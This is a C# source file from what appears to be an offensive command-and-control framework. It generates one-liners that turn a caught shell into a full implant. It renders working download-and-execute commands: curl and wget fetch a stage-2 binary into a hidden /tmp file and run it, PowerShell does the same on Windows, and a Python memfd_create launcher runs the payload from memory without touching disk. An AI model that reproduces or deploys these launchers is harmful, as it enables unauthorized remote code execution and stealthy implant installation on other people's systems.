namespace Rod.Transport.Listeners.ShellCatch;

/// <summary>
/// Renders the one-liners an operator pastes into a caught shell to grow it
/// into a real implant (architecture.md Sec 5.2, Sec 6, Sec 8). Each
/// launcher is the standard fetch-and-run shape the stager half of staging
/// defines -- fetch the stage-2 bytes over the engagement's web listener,
/// present the deployment credential, run what came back -- expressed in the
/// shell family the target is known or guessed to have. The disk-or-memory
/// choice is the operator's at paste time, not a build-time axis: every
/// artifact is a plain native executable with no self-reference, so the
/// Linux in-memory family renders beside the disk trio for every payload.
/// Pure rendering of (url, credential) into commands: the target-side
/// behavior is plain, documented fetch-execute in every family.
/// </summary>
public static class ShellUpgradeLaunchers
{
    /// <summary>One renderable launcher, named for the surface it is pasted into.</summary>
    public sealed record Launcher(string Id, string Os, string Command);

    /// <summary>
    /// Renders the launcher families for a stage-2 fetch at
    /// <paramref name="url"/> authorized by <paramref name="secret"/>. Every
    /// family renders for every payload: the disk trio is the universal
    /// fallback (the shell fingerprint is a guess, and a family that lands a
    /// file beats one that cannot run at all), and every native binary runs
    /// from an anonymous fd, so the in-memory family rides along.
    /// </summary>
    public static IReadOnlyList<Launcher> Render(string url, string secret)
    {
        const string unixPath = "/tmp/.rod-stage2";
        List<Launcher> launchers =
        [
            new Launcher(
                "unix-curl",
                "linux",
                $"curl -fsSL -H 'X-Stager-Token: {secret}' {url} -o {unixPath} && chmod +x {unixPath} && {unixPath}"),

            new Launcher(
                "unix-wget",
                "linux",
                $"wget -q --header='X-Stager-Token: {secret}' -O {unixPath} {url} && chmod +x {unixPath} && {unixPath}"),

            new Launcher(
                "windows-powershell",
                "windows",
                "powershell -c \"$p=\\\"$env:TEMP\\rod-stage2.exe\\\";"
                    + $"iwr '{url}' -Headers @{{'X-Stager-Token'='{secret}'}} -OutFile $p; & $p\""),
        ];

        // Every artifact is a plain ELF with no self-reference, so it runs
        // from an anonymous fd: python3 stages the fetched bytes in a memfd
        // and execs it through /proc/self/fd -- the documented fexecve
        // pattern -- and the stage-2 never lands.
        launchers.Add(new Launcher(
            "unix-python-memfd",
            "linux",
            "python3 -c \"import os,urllib.request;"
                + $"q=urllib.request.Request('{url}',headers={{'X-Stager-Token':'{secret}'}});"
                + "d=urllib.request.urlopen(q).read();"
                + "f=os.memfd_create('rod');"
                + "os.write(f,d);"
                + "os.execv('/proc/self/fd/%d'%f,['rod-implant'])\""));

        return launchers;
    }
}
